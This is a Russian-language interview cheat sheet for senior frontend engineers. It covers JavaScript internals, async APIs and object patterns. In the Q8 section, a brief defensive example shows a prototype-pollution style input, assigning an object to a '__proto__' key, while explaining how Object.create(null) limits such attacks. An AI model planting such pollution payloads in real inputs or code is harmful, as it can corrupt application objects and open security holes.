# 🚀 Senior Frontend Engineer — Мастер-шпаргалка

> **100+ вопросов** с исправленными ответами, Senior-питчами и примерами кода.
> Уровень: Middle+ / Senior / Architect. Финтех / Банки / Энтерпрайз.

---

## 📑 СОДЕРЖАНИЕ

| # | Раздел |
|---|--------|
| 1 | [V8, Memory, Event Loop](#раздел-1-v8-memory-event-loop) |
| 2 | [Асинхронность и Web APIs](#раздел-2-асинхронность-и-web-apis) |
| 3 | [Объекты, Структуры, Паттерны](#раздел-3-объекты-структуры-паттерны) |
| 4 | [Строгий код и Модульность](#раздел-4-строгий-код-и-модульность) |
| 5 | [TypeScript: Основы и Продвинутый](#раздел-5-typescript-основы) |
| 6 | [TypeScript: Хардкор и Компилятор](#раздел-6-typescript-хардкор) |
| 7 | [Performance и Архитектура](#раздел-7-performance-и-архитектура) |
| 8 | [React под капотом](#раздел-8-react-под-капотом) |
| 9 | [Сеть, Безопасность](#раздел-9-сеть-и-безопасность) |
| 10 | [AI & Generative UI](#раздел-10-ai--generative-ui) |
| 11 | [System Design & Паттерны](#раздел-11-system-design--паттерны) |
| 12 | [Быстрые шпаргалки](#раздел-12-быстрые-шпаргалки) |

---

## РАЗДЕЛ 1: V8, Memory, Event Loop

---

### ❓ Q1. Как работает Event Loop в браузере? Разница Microtasks и Macrotasks?

**Официальный ответ:**

```
┌──────────────────────────────────────┐
│   Call Stack (синхронный код)        │
└──────────────────┬───────────────────┘
                   │ стек пуст
                   ▼
┌──────────────────────────────────────┐
│   Microtask Queue (опустошается ВСЯ) │
│   Promise.then / queueMicrotask /    │
│   MutationObserver                   │
└──────────────────┬───────────────────┘
                   │ очередь пуста
                   ▼
      [Браузер МОЖЕТ сделать Render]
      (не гарантировано — решает сам,
       обычно каждые ~16ms / 60fps)
                   │
                   ▼
┌──────────────────────────────────────┐
│   Macrotask Queue (берётся ОДНА)     │
│   setTimeout / setInterval /         │
│   postMessage / I/O                  │
└──────────────────────────────────────┘
```

**⚠️ Уточнения:**
- Рендер **не гарантирован** после каждых микротасок — браузер решает сам
- Микротаски не «блокируют рендер» буквально — они **задерживают переход** к следующему шагу loop, включая возможный рендер
- После каждой макротаски — снова полная очистка очереди микротасок

```js
console.log('1 — синхронный');

setTimeout(() => console.log('4 — macrotask'), 0);

Promise.resolve()
  .then(() => console.log('2 — microtask'))
  .then(() => console.log('3 — microtask chained'));

console.log('1.5 — синхронный');
// Вывод: 1 → 1.5 → 2 → 3 → 4
```

```js
// ❌ Опасность: бесконечные микротаски задержат рендер UI
function floodMicrotasks() {
  Promise.resolve().then(floodMicrotasks); // UI зависнет навсегда
}

// ✅ setTimeout даёт браузеру рендерить между итерациями
function safeMacroLoop() {
  doWork();
  setTimeout(safeMacroLoop, 0);
}
```

**🗣️ Pitch (Senior):**
> *"Ключевое отличие — гарантия выполнения. Все микротаски выполняются до перехода к следующей фазе, включая возможный рендер. Если породить бесконечную цепочку микротасок — UI зависнет, так как рендер никогда не наступит. Макротаски же дают браузеру возможность перерисовать между ними. Знание этого критично при батчинге стейтов в React и при работе с анимациями."*

---

### ❓ Q2. Как V8 оптимизирует объекты? Hidden Classes и Inline Caching?

**Официальный ответ:**

V8 присваивает каждому объекту внутренний **Shape (Hidden Class)**. Если объекты создаются с одинаковыми ключами в одинаковом порядке — они делят один Shape и доступ к свойствам кэшируется через **Inline Caching** (кэш смещений в памяти).

```js
// ✅ Один Shape → V8 применяет Inline Cache
function createPoint(x, y) {
  return { x, y }; // порядок свойств всегда одинаков
}
const p1 = createPoint(1, 2); // Shape A
const p2 = createPoint(3, 4); // Shape A (тот же!)

// ❌ Разные Shape — два отдельных Hidden Class
const a = { x: 1, y: 2 }; // Shape A: x→y
const b = { y: 1, x: 2 }; // Shape B: y→x (другой порядок!)
```

```js
// ❌ Динамическое добавление свойств меняет Shape
const obj = { x: 1 };
obj.y = 2; // Shape меняется: A → B → C (деоптимизация)

// ❌ delete может перевести объект в dictionary mode (хэш-таблица)
// — не всегда, но V8 МОЖЕТ деоптимизировать объект
const obj2 = { x: 1, y: 2 };
delete obj2.x; // потенциальная деоптимизация

// ✅ Лучше обнулять, а не удалять
obj2.x = undefined;

// ✅ Для частых мутаций — Map создан именно для этого
const map = new Map([['x', 1], ['y', 2]]);
map.delete('x'); // без штрафа Shape
```

```js
// ✅ Правило: всегда инициализируй все свойства в конструкторе
class Vector {
  constructor(x, y, z) {
    // Все свойства объявлены сразу — один Shape навсегда
    this.x = x;
    this.y = y;
    this.z = z;
  }
}
```

**🗣️ Pitch (Senior):**
> *"На практике это означает: всегда инициализируй все свойства в конструкторе, не добавляй ключи динамически. `delete obj.key` может перевести объект в режим словаря (dictionary mode), что в разы замедляет доступ к ключам. В высоконагруженных модулях финтеха это существенно бьёт по производительности — особенно в горячих путях обработки транзакций."*

---

### ❓ Q3. Как работает Garbage Collector в JS V8 (Orinoco)?

**Официальный ответ:**

V8 использует **поколенческую** (generational) сборку мусора:

```
Young Generation (~1-8MB)     Old Generation (~hundreds MB)
┌─────────────────────┐       ┌──────────────────────────┐
│  New Space          │  2+   │  Old Space               │
│  Scavenger (быстро) │──────►│  Mark-Sweep-Compact      │
│  копирует выживших  │ рендер│  строит граф достижимости│
└─────────────────────┘       └──────────────────────────┘
```

**⚠️ Важное уточнение:** GC не полностью избегает пауз. Orinoco **минимизирует блокировки** main thread за счёт инкрементальных и конкурентных фаз — но stop-the-world паузы (пусть и короткие) всё равно существуют.

```js
// ❌ Типичные утечки памяти

// 1. Незачищенный EventListener
function mountComponent() {
  const heavyData = new Array(1_000_000).fill('data');
  // heavyData НЕ будет собран GC, пока слушатель висит на btn
  document.getElementById('btn').addEventListener('click', () => {
    console.log(heavyData.length);
  });
}

// ✅ Решение через AbortController
function mountSafe() {
  const controller = new AbortController();
  document.getElementById('btn').addEventListener('click', handler, {
    signal: controller.signal
  });
  return () => controller.abort(); // cleanup
}
```

```js
// 2. Stale Closure в React — самая частая утечка
function BadComponent({ userId }) {
  const [data, setData] = useState(null);

  useEffect(() => {
    // ❌ Нет cleanup — если userId изменится, старый fetch
    // может записать результат в размонтированный компонент
    fetchUser(userId).then(setData);
  }, [userId]);
}

// ✅ Правильный вариант с AbortController
function GoodComponent({ userId }) {
  const [data, setData] = useState(null);

  useEffect(() => {
    const controller = new AbortController();

    fetchUser(userId, { signal: controller.signal })
      .then(setData)
      .catch(e => { if (e.name !== 'AbortError') throw e; });

    return () => controller.abort(); // ← GC сможет собрать всё
  }, [userId]);
}
```

**🗣️ Pitch (Senior):**
> *"Утечки памяти в SPA в основном происходят из-за забытых Event Listeners, не очищенных интервалов и замыканий в глобальных сторах. В React обязательно подчищать всё в `useEffect cleanup`. Для отладки деградирующего перфа я использую Chrome DevTools → Memory → Heap Snapshot: делаю снапшот до и после действий, ищу retained objects."*

---

### ❓ Q4. Что такое Execution Context и Lexical Environment?

**Официальный ответ:**

При вызове функции создаётся **Execution Context** — контейнер состояния выполнения. Он содержит:
- `LexicalEnvironment` → `{ EnvironmentRecord (переменные), outer (ссылка вверх) }`
- `this` binding

За счёт цепочки `outer` ссылок работают **замыкания** и поиск по **Scope Chain**.

```js
// Визуализация цепочки Execution Contexts
function outer() {
  const x = 10; // хранится в LexEnv outer'а

  function middle() {
    const y = 20; // LexEnv middle'а

    function inner() {
      // inner видит: y (из middle), x (из outer), global
      console.log(x + y); // 30 — проходит по Scope Chain
    }
    inner();
  }
  middle();
}
```

```js
// Лексический vs динамический скоупинг
const value = 'global';

function getVal() {
  return value; // смотрит туда, где написан код (лексически)
}

function wrapper() {
  const value = 'local';
  return getVal(); // ← НЕ 'local'! Лексический скоуп — 'global'
}

wrapper(); // 'global' — JS не динамический, а лексический
```

**🗣️ Pitch (Senior):**
> *"Это фундамент скоупинга в JS. Лексический скоуп означает, что область видимости определяется тем, где написан код, а не откуда вызвана функция. Именно поэтому замыкания работают — inner функция несёт ссылку на LexEnv своего outer'а, даже если outer уже завершил выполнение."*

---

### ❓ Q5. Замыкание (Closure) — как работает, угроза утечек памяти?

**Официальный ответ:**

Замыкание — функция вместе со ссылкой на её **Lexical Environment** в момент создания. Функция «помнит» переменные из внешнего scope навсегда.

```js
// Базовое замыкание
function createCounter(initial = 0) {
  let count = initial; // захватывается замыканием

  return {
    increment: () => ++count,
    decrement: () => --count,
    value: () => count,
  };
}

const counter = createCounter(10);
counter.increment(); // 11
counter.increment(); // 12
counter.value();     // 12
// count недоступен снаружи — инкапсуляция без классов!
```

```js
// ❌ Классическая ловушка с var в цикле
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100); // 3, 3, 3 — одна переменная!
}

// ✅ let создаёт новый binding на каждую итерацию
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100); // 0, 1, 2 ✅
}
```

```js
// ❌ Stale Closure в React — частейшая ошибка
function Timer() {
  const [count, setCount] = useState(0);

  useEffect(() => {
    const id = setInterval(() => {
      console.log(count); // ВСЕГДА 0 — замкнул начальное значение!
      setCount(count + 1); // баг: всегда 0+1=1
    }, 1000);
    return () => clearInterval(id);
  }, []); // ← пустые deps = замкнули count=0 навсегда
}

// ✅ Функциональное обновление не зависит от замыкания
useEffect(() => {
  const id = setInterval(() => {
    setCount(prev => prev + 1); // ✅ всегда актуальное значение
  }, 1000);
  return () => clearInterval(id);
}, []);
```

**🗣️ Pitch (Senior):**
> *"В React любой обработчик внутри функционального компонента — это замыкание, захватывающее текущий стейт. Stale Closure — главная причина багов с устаревшими данными в useEffect. Решение — передавать функцию в setState (functional update), использовать useRef для мутабельных значений или правильно указывать deps массив."*

---

### ❓ Q6. TDZ (Temporal Dead Zone) и разница var/let/const?

**Официальный ответ:**

Все переменные «всплывают» (Hoisting) при парсинге. Но:
- `var` → инициализируется `undefined` сразу
- `let/const` → попадают в **TDZ** (доступ до объявления = `ReferenceError`)

```js
// Hoisting в действии
console.log(a); // undefined (var всплыл и инициализировался)
var a = 1;

console.log(b); // ReferenceError: Cannot access 'b' before initialization
let b = 2;      // b в TDZ с начала scope до этой строки
```

```js
// var — функциональный scope, НЕ блочный
{
  var leaked = 'я утеку!';
}
console.log(leaked); // 'я утеку!' — var игнорирует блоки ❌

{
  let scoped = 'я внутри';
}
console.log(scoped); // ReferenceError ✅

// Классическая ловушка
for (var i = 0; i < 3; i++) { /* i будет в window.i после цикла */ }
for (let j = 0; j < 3; j++) { /* j недоступен снаружи */ }
```

```js
// const — защищает ПРИВЯЗКУ, не содержимое
const arr = [1, 2, 3];
arr.push(4);     // ✅ мутируем содержимое объекта
arr = [1, 2, 3]; // ❌ TypeError: Assignment to constant variable

// Полная заморозка объекта
const config = Object.freeze({ host: 'localhost', port: 3000 });
config.port = 8080; // тихо игнорируется (TypeError в strict mode)

// Глубокая заморозка (freeze не рекурсивный!)
const deepFreeze = obj => {
  Object.keys(obj).forEach(key => {
    if (typeof obj[key] === 'object') deepFreeze(obj[key]);
  });
  return Object.freeze(obj);
};
```

**🗣️ Pitch (Senior):**
> *"`var` сегодня — грубейшая ошибка из-за отсутствия Block Scope. `const` по умолчанию — хорошая практика: V8 и TS-компилятор могут проводить больше статических оптимизаций (Control Flow Analysis), зная что переменная не переназначается. `let` только когда реально нужна мутация."*

---

### ❓ Q7. Как определяется контекст `this`? Потеря контекста?

**Официальный ответ:**

| Способ вызова | `this` |
|---|---|
| `obj.method()` | `obj` |
| `fn()` (strict) | `undefined` |
| `fn()` (non-strict) | `window` / `global` |
| `new Fn()` | новый объект |
| `fn.call(ctx)` / `fn.apply(ctx)` | `ctx` |
| `fn.bind(ctx)()` | `ctx` (навсегда) |
| `() => {}` | из лексического окружения |

```js
const obj = {
  name: 'Alice',

  // Обычный метод — this из контекста вызова
  greet() {
    console.log(this.name);
  },

  // Стрелочная — this из лексического env (где написана = obj)
  greetArrow: () => {
    console.log(this?.name); // undefined! Arrow в теле объекта
    // берёт this из модульного/глобального scope, не из obj
  }
};

obj.greet();       // 'Alice' ✅

const fn = obj.greet;
fn();              // undefined (strict) — потеря контекста!

fn.call(obj);      // 'Alice' ✅ — явная привязка
fn.bind(obj)();    // 'Alice' ✅ — bind возвращает новую функцию
```

```js
// ✅ Стрелочные функции в классе — золотой стандарт
class EventHandler {
  name = 'Handler';

  // ❌ Обычный метод потеряет this при передаче как callback
  handleClick() {
    console.log(this.name); // undefined если передать как onClick={this.handleClick}
  }

  // ✅ Class property с arrow — this всегда = инстанс
  handleClickArrow = () => {
    console.log(this.name); // 'Handler' всегда ✅
  };
}

const handler = new EventHandler();
document.addEventListener('click', handler.handleClickArrow); // ✅
```

```js
// ⚠️ Стрелочные функции НЕ могут:
const Arrow = () => {};
new Arrow();         // ❌ TypeError: Arrow is not a constructor
Arrow.prototype;     // undefined

const fn2 = () => arguments; // ❌ ReferenceError — нет arguments
```

**🗣️ Pitch (Senior):**
> *"Потеря контекста стреляет при передаче методов класса как коллбэков: `onClick={this.handleClick}` без bind теряет this. Стрелочные class properties решают это элегантно. Но важно помнить: стрелочные методы не попадают в prototype — каждый инстанс класса получает отдельную копию функции в памяти (небольшой overhead)."*

---

### ❓ Q8. Prototype Chain: `__proto__` vs `prototype`? `Object.create(null)`?

**Официальный ответ:**

- `prototype` — объект-чертёж, существует у **функций-конструкторов** (и классов)
- `__proto__` (или `Object.getPrototypeOf`) — ссылка у каждого **объекта** на прото того, кто его создал

```js
function Animal(name) { this.name = name; }
Animal.prototype.speak = function() { return `${this.name} говорит`; };

const dog = new Animal('Rex');

// Цепочка: dog → Animal.prototype → Object.prototype → null
console.log(dog.__proto__ === Animal.prototype);         // true
console.log(Animal.prototype.__proto__ === Object.prototype); // true
console.log(Object.prototype.__proto__);                 // null — конец цепи

dog.speak();       // 'Rex говорит' — ищет по цепочке ✅
dog.hasOwnProperty('name'); // true — собственное свойство
dog.hasOwnProperty('speak'); // false — в прото
```

```js
// Классы — синтаксический сахар над прото
class Dog extends Animal {
  bark() { return 'Woof!'; }
}

const rex = new Dog('Rex');
// rex → Dog.prototype → Animal.prototype → Object.prototype → null
rex.speak(); // 'Rex говорит' — из Animal.prototype ✅
rex.bark();  // 'Woof!' — из Dog.prototype ✅
```

```js
// Object.create(null) — объект БЕЗ прото
const pureDict = Object.create(null);
pureDict.toString; // undefined — нет Object.prototype!

// Плюсы: снижает риск Prototype Pollution атак
// (не панацея, но устраняет класс атак через __proto__ и constructor)
pureDict['__proto__'] = 'safe'; // просто строковый ключ, не атака

// Сравнение с обычным объектом
const normalObj = {};
normalObj['__proto__'] = { polluted: true }; // опасно без Object.create(null)!
```

**🗣️ Pitch (Senior):**
> *"Объекты из `Object.create(null)` — идеальные словари. Они снижают риск Prototype Pollution: атаки через `obj['__proto__']` или `obj['constructor']` не влияют на Object.prototype. В современном коде для словарей я предпочитаю `Map`, но для конфигов и lookup-таблиц `Object.create(null)` всё ещё актуален."*

---

## РАЗДЕЛ 2: Асинхронность и Web APIs

---

### ❓ Q9. Promise.all vs allSettled vs race vs any?

**Официальный ответ:**

| Метод | Поведение | Когда использовать |
|---|---|---|
| `all` | Ждёт все, fail-fast при первой ошибке | Все запросы критичны |
| `allSettled` | Ждёт все, никогда не падает | Независимые виджеты |
| `race` | Первый завершившийся (успех или ошибка) | Таймаут запроса |
| `any` | Первый УСПЕШНЫЙ, иначе AggregateError | Зеркальные серверы |

```js
// all — fail-fast
try {
  const [user, settings, balance] = await Promise.all([
    fetchUser(id),
    fetchSettings(id),
    fetchBalance(id),
  ]);
  renderDashboard(user, settings, balance);
} catch (e) {
  showError('Не удалось загрузить дашборд'); // один упал = всё упало
}
```

```js
// allSettled — независимые виджеты дашборда
const results = await Promise.allSettled([
  fetchWeather(),
  fetchNews(),
  fetchStocks(),
]);

results.forEach((result, i) => {
  if (result.status === 'fulfilled') {
    renderWidget(i, result.value);
  } else {
    renderWidgetError(i, result.reason);
    // Остальные виджеты продолжают работать ✅
  }
});
```

```js
// race — реализация таймаута запроса
function fetchWithTimeout(url, ms = 5000) {
  const timeout = new Promise((_, reject) =>
    setTimeout(() => reject(new Error(`Timeout after ${ms}ms`)), ms)
  );
  return Promise.race([fetch(url), timeout]);
}
```

```js
// any — CDN fallback
async function loadScript(mirrors) {
  try {
    const fastest = await Promise.any(mirrors.map(url => fetch(url)));
    return fastest;
  } catch (e) {
    // e instanceof AggregateError — все упали
    throw new Error('Все зеркала недоступны');
  }
}
```

**🗣️ Pitch (Senior):**
> *"В BFF паттернах `allSettled` незаменим — дашборд из 10 микросервисов не должен падать из-за одного. `race` использую для таймаутов запросов: соревную fetch с `setTimeout → reject`. `any` — для мультирегиональных CDN: отвечает тот, кто быстрее."*

---

### ❓ Q10. Что происходит под капотом `async/await`?

**Официальный ответ:**

**⚠️ Уточнение:** `async/await` — **не** «сахар над генераторами» в спецификации. Это отдельный механизм поверх Promise. Babel исторически транспилировал через генераторы (`regeneratorRuntime`), но современные движки реализуют нативно.

```js
// async функция всегда возвращает Promise
async function fetchUser(id) {
  const res = await fetch(`/api/users/${id}`); // здесь возвращаем управление Event Loop
  const data = await res.json();
  return data; // Promise<User>
}

// Эквивалент через Promise chain (концептуально)
function fetchUserPromise(id) {
  return fetch(`/api/users/${id}`)
    .then(res => res.json())
    .then(data => data);
}
```

```js
// ❌ Await в цикле — последовательно (медленно)
async function loadAllSlow(ids) {
  const results = [];
  for (const id of ids) {
    results.push(await fetchUser(id)); // каждый ждёт предыдущего
  }
  return results; // время = sum(all requests)
}

// ✅ Promise.all — параллельно
async function loadAllFast(ids) {
  return Promise.all(ids.map(id => fetchUser(id)));
  // время = max(all requests)
}
```

```js
// Обработка ошибок
async function safeLoad(id) {
  try {
    const data = await fetchUser(id);
    return { data, error: null };
  } catch (e) {
    if (e instanceof TypeError) {
      // сетевая ошибка
      return { data: null, error: 'Нет соединения' };
    }
    return { data: null, error: e.message };
  } finally {
    setLoading(false); // выполнится всегда, даже если throw
  }
}
```

**🗣️ Pitch (Senior):**
> *"Понимание механизма важно для производительности: не ставить `await` в циклах для независимых запросов, а батчить через `Promise.all`. Ещё важный нюанс: `async` функция оборачивает возвращаемое значение в Promise, но если внутри вернуть уже готовый Promise — лишней обёртки не будет (Promise flattening)."*

---

### ❓ Q11. AbortController: отмена fetch и EventListener?

**Официальный ответ:**

`AbortController` предоставляет `signal`, который прокидывается в `fetch` или `addEventListener`. При вызове `controller.abort()` запрос прерывается (`DOMException: AbortError`), слушатели удаляются.

```js
// React паттерн — отмена при размонтировании / смене зависимостей
function useUserData(userId) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const controller = new AbortController();

    async function load() {
      setLoading(true);
      try {
        const res = await fetch(`/api/users/${userId}`, {
          signal: controller.signal
        });
        const json = await res.json();
        setData(json);       // ✅ безопасно — запрос не был отменён
      } catch (e) {
        if (e.name === 'AbortError') return; // ожидаемо при cleanup
        console.error('Ошибка загрузки:', e);
      } finally {
        setLoading(false);
      }
    }

    load();

    // Cleanup: вызывается при смене userId или размонтировании
    return () => controller.abort();
  }, [userId]);

  return { data, loading };
}
```

```js
// Отмена нескольких слушателей одним вызовом
const controller = new AbortController();
const { signal } = controller;

document.addEventListener('click', handleClick, { signal });
document.addEventListener('keydown', handleKey, { signal });
window.addEventListener('resize', handleResize, { signal });

// Удаляет все три одним вызовом
controller.abort();
```

**🗣️ Pitch (Senior):**
> *"В React это критичный паттерн. Без AbortController возникают race conditions: старый тяжёлый запрос резолвится позже нового — UI показывает устаревшие данные. Или компонент размонтировался, а fetch завершился и пытается сделать setState на мёртвый компонент (утечка памяти + warning в консоли)."*

---

### ❓ Q12. requestAnimationFrame vs requestIdleCallback?

**Официальный ответ:**

- `rAF`: выполняется **перед** каждым кадром рендеринга (~60 раз/сек). Идеально для JS-анимаций
- `rIC`: выполняется в **периоды простоя** браузера. Для фоновых некритичных задач

```js
// requestAnimationFrame — плавные анимации
function animateBox(element) {
  let startTime = null;
  const duration = 1000; // 1 секунда

  function step(timestamp) {
    if (!startTime) startTime = timestamp;
    const progress = Math.min((timestamp - startTime) / duration, 1);

    // Анимируем ТОЛЬКО transform и opacity (не вызывают Layout!)
    element.style.transform = `translateX(${progress * 200}px)`;

    if (progress < 1) {
      requestAnimationFrame(step); // следующий кадр
    }
  }

  requestAnimationFrame(step);
}
```

```js
// requestIdleCallback — некритичные фоновые задачи
const tasks = [sendAnalytics, prefetchData, cleanupCache];

function runWhenIdle(deadline) {
  // deadline.timeRemaining() — сколько мс осталось до следующего кадра
  while (deadline.timeRemaining() > 0 && tasks.length > 0) {
    const task = tasks.shift();
    task();
  }

  if (tasks.length > 0) {
    requestIdleCallback(runWhenIdle);
  }
}

requestIdleCallback(runWhenIdle, { timeout: 2000 });
// timeout: если браузер не даст idle за 2с — выполнит принудительно
```

**🗣️ Pitch (Senior):**
> *"`rIC` вдохновил создание React Concurrent Mode и Fiber-архитектуры: идея дробить рендеринг и отдавать управление браузеру между чанками работы. Для анимаций — только `rAF`, и только `transform`/`opacity` — они попадают в GPU Compositor Layer, минуя Layout и Paint."*

---

### ❓ Q13. Web Workers vs Service Workers? SharedArrayBuffer?

**Официальный ответ:**

| | Web Worker | Service Worker |
|---|---|---|
| Назначение | Тяжёлые вычисления (CPU) | Прокси сети (PWA, кэш, Push) |
| Жизненный цикл | Жив пока страница жива | Независим от страницы |
| Доступ к DOM | Нет | Нет |
| Общение | `postMessage` (копирование данных) | `postMessage` через clients |

```js
// Web Worker — тяжёлый парсинг JSON без блокировки UI
// worker.js
self.onmessage = ({ data }) => {
  const result = parseHeavyJSON(data); // не блокирует UI!
  self.postMessage(result);
};

// main.js
const worker = new Worker('./worker.js');

worker.postMessage(hugeRawData);
worker.onmessage = ({ data }) => {
  renderTable(data); // данные пришли обработанными
};
```

```js
// SharedArrayBuffer — общая память между потоками (без копирования!)
// Требует Cross-Origin Isolation (COOP/COEP заголовки)
const buffer = new SharedArrayBuffer(4 * 1024); // 4KB
const view = new Int32Array(buffer);

// Worker 1 и Worker 2 работают с одной памятью
// Синхронизация через Atomics
Atomics.store(view, 0, 42);         // атомарная запись
const val = Atomics.load(view, 0);  // атомарное чтение
Atomics.add(view, 0, 1);            // атомарный инкремент

// Atomics.wait / Atomics.notify — семафоры между потоками
```

**🗣️ Pitch (Senior):**
> *"В энтерпрайзе Web Workers используются для парсинга огромных JSON (~10MB финансовых отчётов), криптографии и обработки файлов — не фризя UI. SharedArrayBuffer с Atomics — это по сути мьютексы в JS, нужны для Wasm модулей и видеоредакторов в браузере. Service Workers — фундамент PWA: кэширование, offline-режим, Push Notifications."*

---

## РАЗДЕЛ 3: Объекты, Структуры, Паттерны

---

### ❓ Q14. WeakMap и WeakSet — зачем нужны архитектурно?

**Официальный ответ:**

Ключи — **только объекты**. Ссылки **слабые** (weak): если нет других сильных ссылок на объект-ключ — GC удалит его и запись автоматически. Не итерируемы (нет `.keys()`, `.forEach()`).

```js
// Use-case 1: приватные данные класса
const _private = new WeakMap();

class BankAccount {
  constructor(balance) {
    _private.set(this, { balance, transactions: [] });
  }

  deposit(amount) {
    const data = _private.get(this);
    data.balance += amount;
    data.transactions.push({ type: 'deposit', amount });
  }

  get balance() { return _private.get(this).balance; }
}

const acc = new BankAccount(1000);
acc.deposit(500);
acc.balance; // 1500
// Когда acc = null → GC автоматически очистит WeakMap ✅
// В отличие от Map — нет утечки памяти!
```

```js
// Use-case 2: кэш для DOM-узлов без утечек
const cache = new WeakMap();

function getExpensiveMetrics(element) {
  if (cache.has(element)) {
    return cache.get(element); // из кэша
  }
  const metrics = computeHeavyMetrics(element);
  cache.set(element, metrics);
  return metrics;
}
// Когда элемент удалён из DOM → GC → cache автоматически очищается ✅
```

```js
// WeakSet — отслеживание обработанных объектов
const processed = new WeakSet();

function processOnce(obj) {
  if (processed.has(obj)) return;
  doWork(obj);
  processed.add(obj);
  // Когда obj собирается GC — запись из WeakSet исчезнет автоматически
}
```

**🗣️ Pitch (Senior):**
> *"WeakMap — это кэш без утечек памяти. В отличие от Map, при удалении ключа-объекта не нужен мануальный cleanup. Практика: прятать приватные данные классов до появления `#privateFields`, связывать метаданные с DOM-узлами, мемоизировать вычисления для объектов."*

---

### ❓ Q15. Идеальное глубокое копирование (Deep Clone)?

**Официальный ответ:**

```js
// ✅ structuredClone — современный стандарт (Node 17+, все браузеры 2022+)
const original = {
  date: new Date(),
  map: new Map([['key', 'value']]),
  set: new Set([1, 2, 3]),
  nested: { arr: [1, 2, 3] },
  typed: new Uint8Array([1, 2, 3]),
};

// Поддерживает циклические ссылки!
original.self = original;

const clone = structuredClone(original);
clone.nested.arr.push(4);
console.log(original.nested.arr); // [1, 2, 3] ✅ не тронут

// ❌ НЕ поддерживает:
// - functions (привязаны к замыканиям и контексту)
// - DOM nodes
// - class instances (теряет методы, только данные)
// - WeakMap/WeakSet
```

```js
// ❌ JSON.parse(JSON.stringify()) — старый хак с серьёзными ограничениями
const obj = {
  date: new Date(),       // → строка (теряет тип Date!)
  fn: () => {},           // → исчезает (undefined в JSON)
  undef: undefined,        // → исчезает
  regex: /abc/g,           // → {} (пустой объект)
  map: new Map(),          // → {} (не сериализуется)
  bigNum: 9007199254740993n, // ❌ TypeError: BigInt не поддерживается
};
// Циклические ссылки → TypeError: Converting circular structure to JSON
```

```js
// В Redux/Zustand — намеренно поверхностное копирование (shallow)
// Глубокое копирование всего Store убьёт перф!
const nextState = {
  ...state,
  user: {
    ...state.user,
    name: 'New Name', // меняем только нужное
  }
};
// React сравнивает ссылки (===) для ре-рендера
// Shallow copy создаёт новую ссылку → компонент обновится ✅
```

**🗣️ Pitch (Senior):**
> *"Даже `structuredClone` не копирует функции — они привязаны к замыканиям и контексту выполнения. В архитектуре state-менеджеров мы полагаемся на поверхностное копирование (Shallow Copy) для иммутабельности, так как глубокое копирование всего Store убило бы производительность. structuredClone нужен для изоляции данных между Web Workers."*

---

### ❓ Q16. Оператор `new` под капотом?

**Официальный ответ:**

```js
// Что делает new MyClass(args):
function myNew(Constructor, ...args) {
  // 1. Создаёт пустой объект
  const obj = {};
  // 2. Устанавливает __proto__
  Object.setPrototypeOf(obj, Constructor.prototype);
  // 3. Вызывает конструктор с this = obj
  const result = Constructor.apply(obj, args);
  // 4. Если конструктор вернул объект — используем его,
  //    если примитив — используем obj
  return result instanceof Object ? result : obj;
}
```

```js
// Практическое применение: безопасный конструктор (без new)
function User(name) {
  // Если вызвали без new — this будет window/undefined
  if (!(this instanceof User)) {
    return new User(name); // автоматически создаём экземпляр
  }
  this.name = name;
}

User('Alice');       // ✅ работает даже без new
new User('Alice');   // ✅ работает стандартно
```

```js
// Singleton через замыкание
const Database = (() => {
  let instance = null;

  class DB {
    constructor(url) { this.url = url; }
    query(sql) { /* ... */ }
  }

  return {
    getInstance(url) {
      if (!instance) instance = new DB(url);
      return instance;
    }
  };
})();

const db1 = Database.getInstance('postgres://localhost');
const db2 = Database.getInstance('postgres://other');
db1 === db2; // true — один экземпляр
```

**🗣️ Pitch (Senior):**
> *"Понимание `new` позволяет реализовывать паттерн Singleton, делать безопасные конструкторы без принудительного `new`, и понимать почему instanceof проверяет цепочку прototypeов, а не тип переменной."*

---

### ❓ Q17. Proxy и Reflect APIs?

**Официальный ответ:**

`Proxy` перехватывает операции над объектом (get, set, has, delete...).
`Reflect` — зеркало Proxy-трапов, выполняет дефолтное поведение. Используется вместе с Proxy для корректной работы геттеров (сохранения `receiver`).

```js
// Базовый пример — валидация при записи
const validator = {
  set(target, prop, value, receiver) {
    if (prop === 'age') {
      if (typeof value !== 'number') throw new TypeError('age должен быть числом');
      if (value < 0 || value > 150) throw new RangeError('age: 0-150');
    }
    // receiver важен! Сохраняет правильный this для геттеров
    return Reflect.set(target, prop, value, receiver);
  }
};

const person = new Proxy({}, validator);
person.age = 25;  // ✅
person.age = -1;  // ❌ RangeError
person.age = 'old'; // ❌ TypeError
```

```js
// Реактивность в стиле Vue 3 (упрощённо)
function reactive(obj) {
  return new Proxy(obj, {
    get(target, key, receiver) {
      track(target, key);               // регистрируем зависимость
      const val = Reflect.get(target, key, receiver);
      // Рекурсивно оборачиваем вложенные объекты
      return typeof val === 'object' ? reactive(val) : val;
    },
    set(target, key, value, receiver) {
      const result = Reflect.set(target, key, value, receiver);
      trigger(target, key);             // запускаем зависимые эффекты
      return result;
    }
  });
}
```

```js
// Логирование доступа к объекту (отладка)
function createLogged(obj, name = 'obj') {
  return new Proxy(obj, {
    get(target, prop, receiver) {
      console.log(`[GET] ${name}.${String(prop)}`);
      return Reflect.get(target, prop, receiver);
    },
    set(target, prop, value, receiver) {
      console.log(`[SET] ${name}.${String(prop)} =`, value);
      return Reflect.set(target, prop, value, receiver);
    }
  });
}
```

**🗣️ Pitch (Senior):**
> *"Главная связка: в трапе `get(target, prop, receiver)` — `receiver` критичен. Если объект имеет геттеры, и мы не передадим receiver в `Reflect.get`, геттер получит неправильный `this`. MobX и Vue 3 построены на Proxy именно для реактивного отслеживания зависимостей без явных подписок."*

---

### ❓ Q18. Event Bubbling vs Capturing. `e.target` vs `e.currentTarget`?

**Официальный ответ:**

```
DOM событие проходит 3 фазы:
1. Capture ↓  (от window вниз к элементу)
2. Target   ○  (на самом элементе)
3. Bubble  ↑  (от элемента вверх к window)

e.target         = элемент, который КЛИКНУЛИ (самый глубокий)
e.currentTarget  = элемент, на котором ВИСИТ слушатель
```

```js
// Демонстрация фаз
document.querySelector('#grandparent').addEventListener('click', (e) => {
  console.log('Grandparent (bubble):', e.target.id, '|', e.currentTarget.id);
});

document.querySelector('#grandparent').addEventListener('click', (e) => {
  console.log('Grandparent (capture):', e.target.id);
}, true); // true = capture фаза

// Клик на #child:
// 1. Capture: grandparent (capture)
// 2. Bubble:  grandparent (bubble), e.target='child', e.currentTarget='grandparent'
```

